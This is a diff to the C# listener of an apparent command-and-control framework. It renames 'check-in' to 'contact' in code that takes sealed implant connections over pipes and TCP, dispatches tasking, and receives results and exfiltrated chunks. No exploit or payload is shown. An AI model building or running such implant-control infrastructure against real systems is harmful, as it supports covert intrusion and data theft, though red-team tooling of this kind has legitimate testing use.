@@ -16,9 +16,9 @@ using Task = System.Threading.Tasks.Task;
 
 namespace Rod.Transport.Listeners.Streams;
 
-// The stream check-in bridge (architecture.md Sec 8): the transport-blind
-// check-in flow the named-pipe and raw-TCP listeners share. One connection is
-// one poll check-in -- the request message carries the handshake first, then
+// The stream contact bridge (architecture.md Sec 8): the transport-blind
+// contact flow the named-pipe and raw-TCP listeners share. One connection is
+// one poll contact -- the request message carries the handshake first, then
 // any results, exfil chunks, staged pulls, and channel output; the response
 // message carries the handshake response, staged chunk runs answering the
 // request's demands, and queued tasking while the dispatch budget lasts. The
@@ -42,7 +42,7 @@ namespace Rod.Transport.Listeners.Streams;
 // delivered it.
 
 /// <summary>
-/// Serves one check-in over a duplex stream: read the request message, run
+/// Serves one contact over a duplex stream: read the request message, run
 /// the envelope's sequential poll flow (handshake, ingest, staged answers,
 /// budgeted dispatch), and write the response message.
 /// </summary>
@@ -51,15 +51,15 @@ internal sealed class StreamBeaconBridge
     /// <summary>
     /// The dispatched-tasking budget for one response message, the same budget
     /// the envelope applies: tasking frames are claimed only while they fit,
-    /// and a task that does not fit is requeued for the next check-in.
+    /// and a task that does not fit is requeued for the next contact.
     /// </summary>
     public const int MaxDispatchBytes = 4 * 1024 * 1024;
 
-    // How long one check-in may take end to end: a client that connects and
+    // How long one contact may take end to end: a client that connects and
     // goes silent must not pin a handler on a transport with no HTTP timeouts
     // of its own. Generous against a slow poll cycle, bounded against a dead
     // peer.
-    private static readonly TimeSpan CheckInTimeout = TimeSpan.FromSeconds(30);
+    private static readonly TimeSpan ContactTimeout = TimeSpan.FromSeconds(30);
 
     private readonly HandshakeService _handshake;
     private readonly ISessionRegistry _sessions;
@@ -72,7 +72,7 @@ internal sealed class StreamBeaconBridge
     private readonly EnrollmentService _enrollment;
     private readonly IStagerTokenService _tokens;
     private readonly IPayloadStore _payloads;
-    private readonly EnvelopeCheckInKeys _checkInKeys;
+    private readonly EnvelopeContactKeys _contactKeys;
     private readonly ILogger<StreamBeaconBridge> _logger;
     private readonly BeaconSessionRunner _runner;
 
@@ -81,7 +81,7 @@ internal sealed class StreamBeaconBridge
     // family's stream mode): the implant's stream-mode client advertises it,
     // the poll client does not, and an older server ignores it -- the extra
     // advertisement reads as an unknown capability, so an old teamserver
-    // serves the connection as an ordinary poll check-in.
+    // serves the connection as an ordinary poll contact.
     public const string LiveSessionCapability = "channels.live";
 
     public StreamBeaconBridge(
@@ -96,7 +96,7 @@ internal sealed class StreamBeaconBridge
         EnrollmentService enrollment,
         IStagerTokenService tokens,
         IPayloadStore payloads,
-        EnvelopeCheckInKeys checkInKeys,
+        EnvelopeContactKeys contactKeys,
         ITaskDispatchWake wake,
         LiveChannelHub channels,
         TaskRelayHub relays,
@@ -114,7 +114,7 @@ internal sealed class StreamBeaconBridge
         _enrollment = enrollment;
         _tokens = tokens;
         _payloads = payloads;
-        _checkInKeys = checkInKeys;
+        _contactKeys = contactKeys;
         _logger = logger;
         _runner = new BeaconSessionRunner(
             sessions, tasks, clock, wake, channels, degraded, relays, socks, ingest, tasking);
@@ -122,39 +122,39 @@ internal sealed class StreamBeaconBridge
 
     /// <summary>
     /// Handles one connection in the shape its handshake advertises: the
-    /// ordinary poll exchange -- one check-in, then closed, the next cycle
+    /// ordinary poll exchange -- one contact, then closed, the next cycle
     /// reconnecting -- or, when the handshake advertises
     /// <see cref="LiveSessionCapability"/>, the held live session the stream
     /// modes run (server-push tasking, live channels). Every failure -- a
     /// malformed message, a vanished client, a refused handshake answered
     /// with a bare handshake response -- ends the connection; the next
-    /// check-in reconnects, the cadence the poll shape keeps and the stream
+    /// contact reconnects, the cadence the poll shape keeps and the stream
     /// shape's reconnects borrow.
     /// </summary>
-    public async Task HandleCheckInAsync(Stream stream, Listener listener, CancellationToken stoppingToken)
+    public async Task HandleContactAsync(Stream stream, Listener listener, CancellationToken stoppingToken)
     {
         using var bounded = CancellationTokenSource.CreateLinkedTokenSource(stoppingToken);
-        bounded.CancelAfter(CheckInTimeout);
+        bounded.CancelAfter(ContactTimeout);
         var cancellationToken = bounded.Token;
         try
         {
             // The opening message may carry an EnrollRequest ahead of its
             // handshake (Sec 8), so the first decode accepts the enroll
-            // seal too; every later message on the connection is a check-in.
+            // seal too; every later message on the connection is a contact.
             var opened = await ReadAndDecodeAsync(stream, allowEnroll: true, cancellationToken);
             if (opened is null)
                 return;
             var frames = opened.Frames;
             var sealedKey = (KeyId: opened.Sealed ? opened.KeyId : Guid.Empty, opened.Key);
             var isSealed = opened.Sealed;
-            var checkInCounter = opened.Counter;
+            var contactCounter = opened.Counter;
 
-            // Enrollment over the stream check-in (Sec 8, the same
+            // Enrollment over the stream contact (Sec 8, the same
             // full-independence step QUIC took): the opening message may
             // carry an EnrollRequest ahead of its handshake -- the
             // certificate-less posture makes the carriage clean, no TLS and
             // no second connection. The arm answers as its own message and
-            // reads the next message as the check-in.
+            // reads the next message as the contact.
             if (frames.Count > 0 && frames[0].Kind == FrameKind.EnrollRequest)
             {
                 if (!await ServeEnrollmentAsync(stream, listener, frames[0], opened, cancellationToken))
@@ -172,7 +172,7 @@ internal sealed class StreamBeaconBridge
                     frames = next.Frames;
                     sealedKey = (next.Sealed ? next.KeyId : Guid.Empty, next.Key);
                     isSealed = next.Sealed;
-                    checkInCounter = next.Counter;
+                    contactCounter = next.Counter;
                 }
             }
 
@@ -190,19 +190,19 @@ internal sealed class StreamBeaconBridge
 
             // The key posture gates, checked before the handshake opens
             // anything (the envelope route's own rules, carried here): an
-            // implant bound to a build key at enroll checks in sealed under
+            // implant bound to a build key at enroll contacts sealed under
             // exactly that key -- a plaintext body from it is the refused
             // downgrade, another artifact's key does not impersonate it --
             // and the counter must clear the floor: a replayed body,
             // whatever it claims, turns away without a session or a touch.
             // The refusal is the dropped connection, the raw carriage's
             // answer to the HTTP problem body.
-            if (_checkInKeys.TryGet(implantId) is { } bound)
+            if (_contactKeys.TryGet(implantId) is { } bound)
             {
                 if (!isSealed || sealedKey.KeyId != bound.KeyId)
                     return;
             }
-            if (isSealed && !_checkInKeys.Accept(implantId, checkInCounter))
+            if (isSealed && !_contactKeys.Accept(implantId, contactCounter))
                 return;
 
             var (response, handshake) = await TryHandshakeAsync(implantId, handshakeRequest);
@@ -213,7 +213,7 @@ internal sealed class StreamBeaconBridge
             }
 
             // A genuinely new session is recorded; a reused one (every
-            // check-in after the first) is not, the same flood guard the
+            // contact after the first) is not, the same flood guard the
             // stream and the envelope apply (architecture.md Sec 10.3, Sec 11).
             await BeaconHandshake.AppendSessionOpenedAsync(_audit, handshake, handshakeRequest);
 
@@ -225,7 +225,7 @@ internal sealed class StreamBeaconBridge
                 handshakeRequest.Capabilities,
                 handshake.TaskAcks);
 
-            // One presence touch per check-in, then the session guard: if the
+            // One presence touch per contact, then the session guard: if the
             // session this handshake holds was closed out from under it, stop
             // after the handshake response so the implant re-handshakes on its
             // next cycle.
@@ -244,10 +244,10 @@ internal sealed class StreamBeaconBridge
             // frames as they cross (architecture.md Sec 8, the same runner
             // the gRPC stream, the WebSocket beacon, and the QUIC session
             // run). The runner runs under the listener's own lifetime: the
-            // check-in timeout above bounds the opening exchange, not a held
+            // contact timeout above bounds the opening exchange, not a held
             // session. Sealing rides the same per-message counter discipline
             // the poll exchange carries: every inbound message is a fresh
-            // counter over the check-in purpose tag, every outbound frame
+            // counter over the contact purpose tag, every outbound frame
             // leaves sealed under the response tag when the connection
             // opened sealed.
             if (session.Capabilities.Contains(LiveSessionCapability))
@@ -282,7 +282,7 @@ internal sealed class StreamBeaconBridge
             // collecting validated staged demands for the response. Receive
             // acks from a negotiated implant are accepted and handed to a
             // no-op sink: a poll carrier keeps no ack ledger -- one connection
-            // is one check-in, answered whole or not at all -- so the arm's
+            // is one contact, answered whole or not at all -- so the arm's
             // requeue never applies on this path (architecture.md Sec 10.3).
             var connection = _ingest.OpenConnection();
             var stagedPulls = new List<TaskId>();
@@ -350,14 +350,14 @@ internal sealed class StreamBeaconBridge
             or System.Net.Sockets.SocketException)
         {
             // The client vanished or the host is stopping: the connection
-            // ends, and the next check-in reconnects. A dispatched task whose
+            // ends, and the next contact reconnects. A dispatched task whose
             // response write failed stays claimed for its result -- the same
             // retransmission tolerance the envelope carries.
         }
     }
 
     // One live-session message in: the framed body, or the same counter-
-    // covered sealed shape every check-in body carries (a fresh counter per
+    // covered sealed shape every contact body carries (a fresh counter per
     // message, the floor turned by the same ledger the poll exchange uses).
     // Null drops the connection -- an unsealable or malformed body is the
     // refused cycle, not a negotiated one.
@@ -371,7 +371,7 @@ internal sealed class StreamBeaconBridge
         byte[] body;
         try
         {
-            body = await StreamCheckInFraming.ReadMessageAsync(stream, cancellationToken);
+            body = await StreamContactFraming.ReadMessageAsync(stream, cancellationToken);
         }
         catch (Exception ex) when (ex is IOException or OperationCanceledException)
         {
@@ -390,14 +390,14 @@ internal sealed class StreamBeaconBridge
             }
         }
 
-        if (EnvelopeBeaconCheckIn.TryReadSealedKeyId(body, out var sealedText) is not { } keyId
+        if (EnvelopeBeaconContact.TryReadSealedKeyId(body, out var sealedText) is not { } keyId
             || keyId != sealedKey.KeyId)
             return null;
-        var plain = AesGcmEnvelope.TryUnwrap(sealedText, sealedKey.KeyId, sealedKey.Key, AesGcmEnvelope.CheckInRequestAad);
+        var plain = AesGcmEnvelope.TryUnwrap(sealedText, sealedKey.KeyId, sealedKey.Key, AesGcmEnvelope.ContactRequestAad);
         if (plain is null || plain.Length < 8)
             return null;
         var counter = System.Buffers.Binary.BinaryPrimitives.ReadInt64BigEndian(plain);
-        if (!_checkInKeys.Accept(implantId, counter))
+        if (!_contactKeys.Accept(implantId, counter))
             return null;
         try
         {
@@ -419,8 +419,8 @@ internal sealed class StreamBeaconBridge
         var body = EnvelopeFraming.Encode(new[] { frame });
         if (isSealed)
             body = System.Text.Encoding.UTF8.GetBytes(AesGcmEnvelope.Wrap(
-                body, sealedKey.KeyId, sealedKey.Key, AesGcmEnvelope.CheckInResponseAad));
-        await StreamCheckInFraming.WriteMessageAsync(stream, body, cancellationToken);
+                body, sealedKey.KeyId, sealedKey.Key, AesGcmEnvelope.ContactResponseAad));
+        await StreamContactFraming.WriteMessageAsync(stream, body, cancellationToken);
     }
 
     // One response message out: the framed body, or the same body sealed
@@ -434,8 +434,8 @@ internal sealed class StreamBeaconBridge
         var body = EnvelopeFraming.Encode(outbound);
         if (isSealed)
             body = System.Text.Encoding.UTF8.GetBytes(AesGcmEnvelope.Wrap(
-                body, sealedKey.KeyId, sealedKey.Key, AesGcmEnvelope.CheckInResponseAad));
-        await StreamCheckInFraming.WriteMessageAsync(stream, body, stoppingToken);
+                body, sealedKey.KeyId, sealedKey.Key, AesGcmEnvelope.ContactResponseAad));
+        await StreamContactFraming.WriteMessageAsync(stream, body, stoppingToken);
     }
 
     private async Task RespondAsync(
@@ -495,7 +495,7 @@ internal sealed class StreamBeaconBridge
             _enrollment,
             _tokens,
             _payloads,
-            _checkInKeys,
+            _contactKeys,
             _audit,
             _clock,
             cancellationToken);
@@ -540,7 +540,7 @@ internal sealed class StreamBeaconBridge
         if (opened.Sealed)
             body = System.Text.Encoding.UTF8.GetBytes(AesGcmEnvelope.Wrap(
                 body, opened.KeyId, opened.Key, AesGcmEnvelope.EnrollResponseAad));
-        await StreamCheckInFraming.WriteMessageAsync(stream, body, cancellationToken);
+        await StreamContactFraming.WriteMessageAsync(stream, body, cancellationToken);
     }
 
     private static string? NullWhenEmpty(string value)
@@ -556,7 +556,7 @@ internal sealed class StreamBeaconBridge
     // magic || keyId || nonce || ciphertext || tag, AES-256-GCM under the
     // artifact's per-build key, the same application-layer seal the
     // cleartext http posture carries, so a bare socket or pipe leaks no
-    // frame bytes either. The check-in body wraps a strictly increasing
+    // frame bytes either. The contact body wraps a strictly increasing
     // counter (8 bytes, big-endian) ahead of the framed bytes; the enroll
     // exchange (the opening message, allowEnroll) seals its frames without
     // one. A body that names no known key, or does not verify under it, is
@@ -567,7 +567,7 @@ internal sealed class StreamBeaconBridge
         byte[] body;
         try
         {
-            body = await StreamCheckInFraming.ReadMessageAsync(stream, cancellationToken);
+            body = await StreamContactFraming.ReadMessageAsync(stream, cancellationToken);
         }
         catch (Exception ex) when (ex is EnvelopeFramingException or IOException or OperationCanceledException)
         {
@@ -577,7 +577,7 @@ internal sealed class StreamBeaconBridge
         var framed = body;
         var sealedShape = (Sealed: false, KeyId: Guid.Empty, Key: Array.Empty<byte>());
         long counter = 0;
-        if (EnvelopeBeaconCheckIn.TryReadSealedKeyId(body, out var sealedText) is { } keyId)
+        if (EnvelopeBeaconContact.TryReadSealedKeyId(body, out var sealedText) is { } keyId)
         {
             var carrier = await _payloads.FindByEnvelopeKeyAsync(keyId, cancellationToken);
             if (carrier?.EnvelopeKey is not { } key)
@@ -587,7 +587,7 @@ internal sealed class StreamBeaconBridge
                 plain = AesGcmEnvelope.TryUnwrap(sealedText, keyId, key, AesGcmEnvelope.EnrollRequestAad);
             if (plain is null)
             {
-                plain = AesGcmEnvelope.TryUnwrap(sealedText, keyId, key, AesGcmEnvelope.CheckInRequestAad);
+                plain = AesGcmEnvelope.TryUnwrap(sealedText, keyId, key, AesGcmEnvelope.ContactRequestAad);
                 if (plain is null || plain.Length < 8)
                     return null;
                 counter = System.Buffers.Binary.BinaryPrimitives.ReadInt64BigEndian(plain);
